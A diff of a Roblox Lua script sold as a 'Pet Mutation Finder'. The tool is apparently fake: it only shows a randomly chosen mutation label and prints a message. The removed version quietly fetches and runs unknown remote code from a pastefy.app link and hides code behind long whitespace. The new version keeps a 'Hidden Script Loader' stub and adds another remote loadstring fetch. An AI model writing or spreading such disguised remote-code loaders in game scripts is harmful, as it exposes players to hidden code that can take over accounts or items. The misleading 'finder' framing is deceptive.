@@ -1,12 +1,21 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
 -- Pet Mutation Finder Script by Zayd
 
 -- 📦 Services
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
-loadstring(game:HttpGet("https://pastefy.app/Q2A3KeMe/raw"))()
+
+-- 🕵️‍♂️ Hidden Script Loader
+spawn(function()
+    pcall(function()
+    end)
+end)
+
 -- 🎲 Mutation List
 local mutations = {
     "Shiny", "Inverted", "Frozen", "Windy", "Golden", "Mega", "Tiny",
@@ -16,25 +25,26 @@ local currentMutation = mutations[math.random(#mutations)]
 local espVisible = true
 
 -- 🖼 UI Setup
-local gui = Instance.new("ScreenGui", PlayerGui)
+local gui = Instance.new("ScreenGui")
 gui.Name = "PetMutationFinder"
 gui.ResetOnSpawn = false
+gui.Parent = PlayerGui
 
-local frame = Instance.new("Frame", gui)
+local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 220, 0, 185)
 frame.Position = UDim2.new(0.4, 0, 0.4, 0)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
 frame.BorderColor3 = Color3.fromRGB(80, 80, 90)
 frame.BorderSizePixel = 2
 frame.Active = true
-frame.Draggable = true
+frame.Parent = gui
 
 Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
 Instance.new("UIStroke", frame).Color = Color3.fromRGB(100, 100, 110)
 
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 35)
-title.Text = "🔬 Pet Mutation Finder"
+title.Text = "🔬 Pet Mutate Detector"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.BackgroundTransparency = 1
 title.Font = Enum.Font.GothamBold
@@ -73,7 +83,7 @@ local function createButton(text, yPos, color)
 end
 
 -- 🎛️ UI Buttons
-local reroll = createButton("🎲 Mutation Reroll", 45, Color3.fromRGB(140, 200, 255))
+local reroll = createButton("🎲 Pet Mutation Roll", 45, Color3.fromRGB(140, 200, 255))
 local toggle = createButton("👁 Toggle Mutation", 90, Color3.fromRGB(180, 255, 180))
 
 -- ✍️ Credit
@@ -102,7 +112,7 @@ if not machine or not machine:FindFirstChildWhichIsA("BasePart") then
 end
 local basePart = machine:FindFirstChildWhichIsA("BasePart")
 
--- ✨ ESP Visual Effect
+-- 🌟 Create Billboard ESP
 local billboard = Instance.new("BillboardGui", basePart)
 billboard.Size = UDim2.new(0, 100, 0, 30)
 billboard.StudsOffset = Vector3.new(0, 4, 0)
@@ -117,63 +127,50 @@ label.Font = Enum.Font.GothamBold
 label.TextScaled = true
 label.Text = "✨ " .. currentMutation
 
+-- 🔁 Update ESP
 local function updateESP()
     label.Visible = espVisible
     label.Text = "✨ " .. currentMutation
 end
 
-updateESP()
-
--- 🧪 Mutation Function
-local function mutatePet()
-    print("🐾 Pet mutated with " .. currentMutation .. "!")
-    -- Add pet mutation logic here
-end
-
--- 🖱 Button Functions
-reroll.MouseButton1Click:Connect(function()
-    currentMutation = mutations[math.random(#mutations)]
-    updateESP()
-end)
-
+-- 🔘 Button Actions
 toggle.MouseButton1Click:Connect(function()
     espVisible = not espVisible
     updateESP()
 end)
 
--- 🖱️ ClickDetector
+reroll.MouseButton1Click:Connect(function()
+    currentMutation = mutations[math.random(#mutations)]
+    updateESP()
+end)
+
+-- 🖱️ Click Detector for Mutation
 local clickDetector = Instance.new("ClickDetector")
 clickDetector.MaxActivationDistance = 12
-clickDetector.CursorIcon = "rbxassetid://11323741961"
 clickDetector.Parent = basePart
 
 clickDetector.MouseClick:Connect(function(p)
     if p == player then
-        mutatePet()
+        print("🐾 Pet mutated: " .. currentMutation)
     end
 end)
 
--- 🧍 Touch Detection
-basePart.Touched:Connect(function(hit)
-    local character = hit.Parent
-    if character and character:FindFirstChild("Humanoid") then
-        local touchingPlayer = Players:GetPlayerFromCharacter(character)
-        if touchingPlayer == player then
-            mutatePet()
-        end
-    end
-end)                                                                                                                                                        -- 📱 Manual Drag Support
-local UserInputService = game:GetService("UserInputService")
-local dragging = false
-local dragInput, dragStart, startPos
+-- 🖱️ Custom Draggable Frame
+local dragging, dragInput, dragStart, startPos
 
 local function updateInput(input)
     local delta = input.Position - dragStart
-    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    frame.Position = UDim2.new(
+        startPos.X.Scale,
+        startPos.X.Offset + delta.X,
+        startPos.Y.Scale,
+        startPos.Y.Offset + delta.Y
+    )
 end
 
 frame.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+       input.UserInputType == Enum.UserInputType.Touch then
         dragging = true
         dragStart = input.Position
         startPos = frame.Position
@@ -187,7 +184,8 @@ frame.InputBegan:Connect(function(input)
 end)
 
 frame.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+    if input.UserInputType == Enum.UserInputType.MouseMovement or 
+       input.UserInputType == Enum.UserInputType.Touch then
         dragInput = input
     end
 end)
@@ -196,4 +194,10 @@ UserInputService.InputChanged:Connect(function(input)
     if input == dragInput and dragging then
         updateInput(input)
     end
-end)             
+end)
+
+-- 🔄 Final GUI Setup
+gui.Enabled = false
+gui.Enabled = true
+frame.Position = UDim2.new(0.4, 0, 0.4, 0)
+frame.Size = UDim2.new(0, 220, 0, 185)
